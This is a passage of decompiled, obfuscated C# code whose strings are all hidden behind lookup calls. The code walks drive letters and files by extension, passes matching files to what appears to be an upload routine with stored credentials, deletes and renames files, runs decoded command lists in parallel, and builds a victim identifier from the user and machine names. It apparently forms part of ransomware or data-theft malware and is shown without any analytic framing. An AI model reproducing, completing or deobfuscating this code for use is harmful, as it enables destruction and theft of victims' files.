							if (CS_0024_003C_003E8__locals0.eAApvYWrRc.ToLower().EndsWith(item) && XvBfbWHuciprZZ == getString_0(107396968))
							{
								if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389851), getString_0(107389846), getString_0(107389289), CS_0024_003C_003E8__locals0.eAApvYWrRc);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.eAApvYWrRc.ToLower().EndsWith(item) && XvBfbWHuciprZZ == getString_0(107396466))
							{
								try
								{
									hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389851), getString_0(107389846), getString_0(107389289), CS_0024_003C_003E8__locals0.eAApvYWrRc);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.eAApvYWrRc);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.ozpNWwBFrGtY.EndsWith(getString_0(107385682)))
					{
						File.Move(CS_0024_003C_003E8__locals0.ozpNWwBFrGtY, CS_0024_003C_003E8__locals0.ozpNWwBFrGtY.Replace(getString_0(107385682), getString_0(107389226)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.ozpNWwBFrGtY))
							{
								File.Delete(CS_0024_003C_003E8__locals0.ozpNWwBFrGtY);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(AJzDKHoaGNRf, getString_0(107386446) + CS_0024_003C_003E8__locals0.eAApvYWrRc + getString_0(107385641) + ex2.Message + getString_0(107396488));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> kqSlrFXjTdVr = KqSlrFXjTdVr;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385620)), string_0);
			};
		}
		Parallel.ForEach(kqSlrFXjTdVr, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> source = kMlHmqLOtrVRDv;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385575)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (DlnPdlTNOzZKWXo == getString_0(107396968))
		{
			string[] source2 = iMIFZZADTYmjt;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385575)), getString_0(107385582) + string_0 + getString_0(107385541));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!KcMNmzTKVuN().Contains(getString_0(107386280)))
		{
			fTntuKaZyTzi(yhzLVMUnRzyNJL);
		}
		else
		{
			List<string> aUaPVUwjLyfdAW = AUaPVUwjLyfdAW;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					QKkRdHWXNelGs(EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107385536))), string_0);
				};
			}
			Parallel.ForEach(aUaPVUwjLyfdAW, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> source3 = yZGtRUXyYPE;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385511)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385620)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385575)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385575)), getString_0(107385582) + string_0 + getString_0(107385541));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		QKkRdHWXNelGs(EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107385536))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		QKkRdHWXNelGs(EvKBdYIakj(getString_0(107385511)), string_0);
	}

	private static void _003CMapDrv_003Eb__18(string string_0)
	{
		DnFyLezoexaawD CS_0024_003C_003E8__locals0 = new DnFyLezoexaawD();
		CS_0024_003C_003E8__locals0.QPiYaXjxNzol = string_0;
		if ((!CS_0024_003C_003E8__locals0.QPiYaXjxNzol.StartsWith(getString_0(107385526)) && !CS_0024_003C_003E8__locals0.QPiYaXjxNzol.StartsWith(getString_0(107385521)) && !CS_0024_003C_003E8__locals0.QPiYaXjxNzol.StartsWith(getString_0(107385480)) && !CS_0024_003C_003E8__locals0.QPiYaXjxNzol.StartsWith(getString_0(107389226))) || !coBWxmnoGcnU.rMZPfYootxOJU(CS_0024_003C_003E8__locals0.QPiYaXjxNzol))
		{
			return;
		}
		try
		{
			Thread.Sleep(MpJOfNTSgoM);
			ErNGCzDqbgJcNq.Add(getString_0(107387867) + CS_0024_003C_003E8__locals0.QPiYaXjxNzol + getString_0(107385499));
			try
			{
				if (DHKhstFrxWX)
				{
					Console.WriteLine(getString_0(107387867) + CS_0024_003C_003E8__locals0.QPiYaXjxNzol + getString_0(107385499));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(MpJOfNTSgoM);
				ErNGCzDqbgJcNq.Add(DnFyLezoexaawD.getString_0(107387873) + CS_0024_003C_003E8__locals0.QPiYaXjxNzol + DnFyLezoexaawD.getString_0(107396896) + (char)int_0 + DnFyLezoexaawD.getString_0(107411747));
				try
				{
					if (DHKhstFrxWX)
					{
						Console.WriteLine(DnFyLezoexaawD.getString_0(107387873) + CS_0024_003C_003E8__locals0.QPiYaXjxNzol + DnFyLezoexaawD.getString_0(107396896) + (char)int_0 + DnFyLezoexaawD.getString_0(107411747));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static FcnBvlzKWyQDwH()
	{
		Strings.CreateGetStringDelegate(typeof(FcnBvlzKWyQDwH));
		XQBvVaBiYNtbTGQ = getString_0(107388708);
		NLiEmQZDarX = null;
		eaVwpFidBvEVE = getString_0(107396466);
		bpXPuDgesBNQk = getString_0(107385490);
		ErNGCzDqbgJcNq = new List<string>();
		FEyXLHljGVb = new List<string>();
		rnCYEPnajebIl = getString_0(107396466);
		ptbrIyAxDBqTL = getString_0(107389226);
		MxPnNSnkNuk = getString_0(107389226);
		CcZHpsCIoJG = getString_0(107389226);
		mOUSujsRKqplh = getString_0(107396466);
		BQnkHErquGiOdm = 0;
		tFYBgTlzqriJCl = getString_0(107396466);
		cxPNZAQFWJPJy = getString_0(107396466);
		vzcriJeQmyz = getString_0(107396466);
		xELZNLRmENNyZ = getString_0(107385957);
		kqQXtlPdyZIta = getString_0(107396466);
		zFfyXyoQvalL = getString_0(107396466);
		qvMgChtEAZLg = getString_0(107396466);
		OMtKsvaQdirySzwjg = getString_0(107396466);
		yqZYLXbivBjkb = new List<string>
		{
			EvKBdYIakj(getString_0(107385952)),
			EvKBdYIakj(getString_0(107385967)),
			EvKBdYIakj(getString_0(107385942)),
			EvKBdYIakj(getString_0(107385893)),
			EvKBdYIakj(getString_0(107385900)),
			EvKBdYIakj(getString_0(107385875)),
			EvKBdYIakj(getString_0(107385826)),
			EvKBdYIakj(getString_0(107385801)),
			EvKBdYIakj(getString_0(107385808)),
			EvKBdYIakj(getString_0(107385783)),
			EvKBdYIakj(getString_0(107385734)),
			EvKBdYIakj(getString_0(107385741)),
			EvKBdYIakj(getString_0(107385204))
		};
		AVcTEbDnEiIrK = new List<string>();
		qBlIlUrBcLeqW = getString_0(107396968);
		pbIpERIRkl = getString_0(107396466);
		AOMaLufrZchMC = getString_0(107396466);
		mOohEoBvvwIsCph = new List<string>();
		NqxhHNylXDzJMss = getString_0(107396466);
		pBLfmQvNDQLAtEZlD = getString_0(107385179);
		dWQLbOGxxGUm = getString_0(107396466);
		xiGnCMeIjTYAmwP = getString_0(107396466);
		KqSlrFXjTdVr = new List<string>
		{
			EvKBdYIakj(getString_0(107385098)),
			EvKBdYIakj(getString_0(107385081)),
			EvKBdYIakj(getString_0(107385000)),
			EvKBdYIakj(getString_0(107384983)),
			EvKBdYIakj(getString_0(107385414)),
			EvKBdYIakj(getString_0(107385349)),
			EvKBdYIakj(getString_0(107385304)),
			EvKBdYIakj(getString_0(107385243))
		};
		kMlHmqLOtrVRDv = new List<string>
		{
			EvKBdYIakj(getString_0(107384642)),
			EvKBdYIakj(getString_0(107384609)),
			EvKBdYIakj(getString_0(107384596)),
			EvKBdYIakj(getString_0(107384515)),
			EvKBdYIakj(getString_0(107384482)),
			EvKBdYIakj(getString_0(107384465)),
			EvKBdYIakj(getString_0(107384900)),
			EvKBdYIakj(getString_0(107384867)),
			EvKBdYIakj(getString_0(107384834)),
			EvKBdYIakj(getString_0(107384801)),
			EvKBdYIakj(getString_0(107384768)),
			EvKBdYIakj(getString_0(107384735)),
			EvKBdYIakj(getString_0(107384726)),
			EvKBdYIakj(getString_0(107384173)),
			EvKBdYIakj(getString_0(107384096)),
			EvKBdYIakj(getString_0(107384063)),
			EvKBdYIakj(getString_0(107384054)),
			EvKBdYIakj(getString_0(107384021)),
			EvKBdYIakj(getString_0(107383980)),
			EvKBdYIakj(getString_0(107384419)),
			EvKBdYIakj(getString_0(107384386)),
			EvKBdYIakj(getString_0(107384377)),
			EvKBdYIakj(getString_0(107384344)),
			EvKBdYIakj(getString_0(107384642)),
			EvKBdYIakj(getString_0(107384303)),
			EvKBdYIakj(getString_0(107384230)),
			EvKBdYIakj(getString_0(107384217)),
			EvKBdYIakj(getString_0(107383672)),
			EvKBdYIakj(getString_0(107383631)),
			EvKBdYIakj(getString_0(107383558)),
			EvKBdYIakj(getString_0(107383525)),
			EvKBdYIakj(getString_0(107383484)),
			EvKBdYIakj(getString_0(107383475)),
			EvKBdYIakj(getString_0(107384609)),
			EvKBdYIakj(getString_0(107383914)),
			EvKBdYIakj(getString_0(107384596)),
			EvKBdYIakj(getString_0(107383881)),
			EvKBdYIakj(getString_0(107383848)),
			EvKBdYIakj(getString_0(107383807)),
			EvKBdYIakj(getString_0(107383774)),
			EvKBdYIakj(getString_0(107383765)),
			EvKBdYIakj(getString_0(107383724)),
			EvKBdYIakj(getString_0(107383147)),
			EvKBdYIakj(getString_0(107383114)),
			EvKBdYIakj(getString_0(107383073)),
			EvKBdYIakj(getString_0(107383064)),
			EvKBdYIakj(getString_0(107383023))
		};
		AUaPVUwjLyfdAW = new List<string>
		{
			EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107382950))),
			EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107382933))),
			EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107383352))),
			EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107383255))),
			EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107382650))),
			EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107382553))),
			EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107382428))),
			EvKBdYIakj(getString_0(107382875)),
			EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107382750))),
			EvKBdYIakj(getString_0(107382653)),
			EvKBdYIakj(getString_0(107382048)),
			EvKBdYIakj(getString_0(107381951)),
			EvKBdYIakj(getString_0(107382370)),
			EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107382950)))
		};
		yhzLVMUnRzyNJL = EvKBdYIakj(getString_0(107382273));
		yZGtRUXyYPE = new List<string>
		{
			EvKBdYIakj(getString_0(107382192)),
			EvKBdYIakj(getString_0(107381486)),
			EvKBdYIakj(getString_0(107381804)),
			EvKBdYIakj(getString_0(107381066)),
			EvKBdYIakj(getString_0(107380872)),
			EvKBdYIakj(getString_0(107381190))
		};
		imORVFuEji = new List<string>
		{
			EvKBdYIakj(getString_0(107413252)),
			EvKBdYIakj(getString_0(107413191)),
			EvKBdYIakj(getString_0(107413130))
		};
		FaZaotFvYkeG = getString_0(107396466);
		NrzxQagFmfLz = getString_0(107396466);
		AHawKajwZkwOUCb = new DateTime(2000, 1, 1);
		UgctjaZsMMy = new DateTime(2100, 1, 1);
		QhxiUhpytB = getString_0(107396968);
		KHcVbQthlIOKM = getString_0(107386251);
		ZXoHndgsjM = getString_0(107396466);
		JDhxrqdOrRrI = getString_0(107396466);
		zbWMLuuocgT = getString_0(107396466);
		RdvsLzXZvbqcn = getString_0(107396968);
		OluHGjurQVbXs = getString_0(107396466);
		oaMCRFYrdbFfau = getString_0(107396466);
		WOAZqErHQpvAHsj = new List<string>
		{
			getString_0(107396140),
			getString_0(107395342),
			getString_0(107396174),
			getString_0(107395223)
		};
		XvBfbWHuciprZZ = getString_0(107396466);
		cfZDnOvovZah = getString_0(107413613);
		gcostyhfeUvsHC = getString_0(107396466);
		UHWPXSoPUMg = getString_0(107396466);
		PBSVsTvpkrUe = getString_0(107396466);
		EpCsDxtJYsZGzw = string.Empty;
		dIyPcHMpaUp = getString_0(107396466);
		JWeCzmkXGapsEO = getString_0(107396968);
		cHlMXqrlaqguL = getString_0(107396968);
		mSrKrgVcQPqlFZ = getString_0(107413576);
		JlvCoFbKLcBH = getString_0(107413503);
		zhAZxZZxAfXTcT = getString_0(107396466);
		YwMZGWWwwR = getString_0(107396968);
		fWdwNKveSnXZw = getString_0(107396968);
		RzqCCCsKOn = getString_0(107396466);
		NhynxdjaLBv = getString_0(107396466);
		JdraEdbLNwPZxsL = getString_0(107389388);
		KFBJsFTZQCtYi = getString_0(107396466);
		fXpSSYeekBJZJE = getString_0(107396968);
		dkWBHAPryK = getString_0(107412285);
		faWRRnNYaT = getString_0(107396466);
		EfiHSAKjAHyl = getString_0(107396466);
		SnXfyvTxvoJ = getString_0(107396466);
		gQGxNFPuSnfa = getString_0(107396466);
		cPaKpWJfcXNc = getString_0(107412300);
		vksVCeVTJovM = getString_0(107396968);
		LhIskusGNtqPC = getString_0(107396968);
		fYklMiPjwvEMMM = getString_0(107396466);
		DlnPdlTNOzZKWXo = getString_0(107396466);
		iMIFZZADTYmjt = new string[0];
		NrRjEEeptLvAPsW = getString_0(107396968);
		oVxIyLzScyQqp = true;
		hbPuJuPPGYgMOGV = getString_0(107396968);
		YrjqOIvQHnLHl = true;
		PDbIQyycteW = false;
		MnUmMqCrYFJvnIK = false;
		ugqwmwtvqbFo = false;
		AJzDKHoaGNRf = getString_0(107412255);
		IxPlnZLdvsZB = false;
		MaALatKWWDkon = false;
		wtSBZSBblNtap = false;
		EjCdzBangCjgRE = false;
		aYdUAapWGSeW = true;
		THXwmzLnrqe = getString_0(107412234) + Environment.UserName + getString_0(107412221) + Environment.MachineName + getString_0(107412200) + hdkhpYUKtylncPr.GNhfBZvUwCJTZVIF() + getString_0(107412195);
		DHKhstFrxWX = false;
		VdNQzJyOFXqjq = new Stopwatch();
		YQVkVIVGpFAMQ = 0;
		emFRwwndTZvr = 0;
		ftECRArlHKepq = false;
		ITyFXeyNngsRQ = getString_0(107412218) + hdkhpYUKtylncPr.GNhfBZvUwCJTZVIF() + getString_0(107412209);
		DXLtZmyxCdw = new string[1] { getString_0(107412204) };
		ASvnhkEKlK = new List<string>();
		MpJOfNTSgoM = 0;
		FLrXpcNUru = false;
		lNurPNsNYgGP = true;
		DOtLkCUQkgViIsPR = false;
		zmkyOqtOWhAMq = false;
		lbKtRvXlZTmt = false;
		ftzzNtuKSF = false;
		clyvuVTVcB = new List<string>();
		CfFFFjArTGyB = getString_0(107412595);
		WXjJcHajhkaSgC = true;
		zwcghQHXyETN = new List<string>();
		VWzCYYzaUNuJetkL = new List<string>();
		SznCfFdSth = new List<string>();
	}
}
